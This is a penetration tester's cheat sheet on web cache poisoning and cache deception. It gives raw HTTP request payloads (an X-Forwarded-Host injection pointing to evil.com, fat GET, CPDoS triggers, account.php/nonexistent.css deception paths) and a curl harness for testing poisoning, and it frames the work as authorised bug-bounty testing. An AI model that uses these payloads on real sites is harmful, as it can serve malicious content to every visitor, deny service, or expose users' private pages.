# Web Cache Poisoning

Inject into cached response → served to subsequent users. Also: Cache Deception (leak private pages).

## Find the cache

Response headers:

- `X-Cache: HIT|MISS|BYPASS`
- `CF-Cache-Status: HIT|MISS|EXPIRED|DYNAMIC`
- `Age: <s>`
- `X-Served-By`, `X-Cache-Hits`, `Via`
- `Cache-Control: public, max-age=...`

Identify cache key: typically host + path + query (maybe not all params). Unkeyed fields are where you attack.

## Unkeyed header/param discovery

Param Miner (Burp extension):

- Right-click → Param Miner → "Guess headers" / "Guess params" / "Guess cookies".
- Flags when a header influences the response but isn't part of cache key.

Common unkeyed inputs:

- `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, `X-Rewrite-URL`.
- `X-Forwarded-For` (sometimes reflected in errors).
- Cookies rarely keyed on static assets.
- Weird params like `utm_source`, `fbclid` often stripped from key.

## Classic exploit

```
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```

If response body contains `<link href="https://evil.com/...">` or script src, and response is cached — every user hitting `/` gets evil.com content.

## Fat GET

Body on GET requests. Some caches ignore body; origin uses it.

```
GET / HTTP/1.1
Host: target.com
Content-Length: 10

data=evil
```

## CPDoS (Cache Poisoning DoS)

Force origin to return 400/403/404 into cache → denial of service for all users.

- `X-Meta-Override: abc` → origin errors → cached.
- Oversized header → origin 400 → cached.
- Encoded path `/%2e%2e/` → origin 404 → cached.
- HTTP/0.9 request → origin error → cached.

## Cache deception

Opposite direction — trick cache into storing private pages as public static content.

```
GET /account.php/nonexistent.css HTTP/1.1
```

If app serves `/account.php` (ignores extension) but cache treats `.css` as public static → victim's account page cached → attacker reads.

Variants: `.js`, `.css`, `.jpg`, `/static/`, `;nonexistent.css`, `?file.css`, `%00.css` (null-byte).

## Key normalization quirks

- `Host: TARGET.COM` vs `target.com` — case differences.
- Path `/`, `/.`, `/%2e`, `//` treated differently by cache vs origin.
- Cookie sorting, header ordering.
- Query string: `?a=1&b=2` vs `?b=2&a=1` — same key or not?

## Testing harness

```bash
# Probe cache
curl -si https://target.com/ | grep -iE 'x-cache|age|cf-cache-status'

# Force miss to baseline
curl -si "https://target.com/?cb=$RANDOM" | head -20

# Poison attempt
curl -si "https://target.com/?cb=race1" -H "X-Forwarded-Host: evil.com"

# Verify poison from different client
curl -si "https://target.com/?cb=race1" | grep evil.com
```

Use cache-busting param (`?cb=`) to avoid polluting real users during testing. Remove once confirmed.

## Reporting

- Impact: stored XSS on popular page, redirect of all users to phishing, DoS.
- Evidence: poison from one IP, read from another clean IP.
- Include cache-buster usage — prove you didn't hit real users beyond PoC window.

## References

- PortSwigger cache poisoning — https://portswigger.net/research/practical-web-cache-poisoning
- Kettle — https://portswigger.net/research/web-cache-entanglement
- CPDoS — https://cpdos.org
- OmerGil cache deception — https://github.com/omergil/Web-Cache-Deception
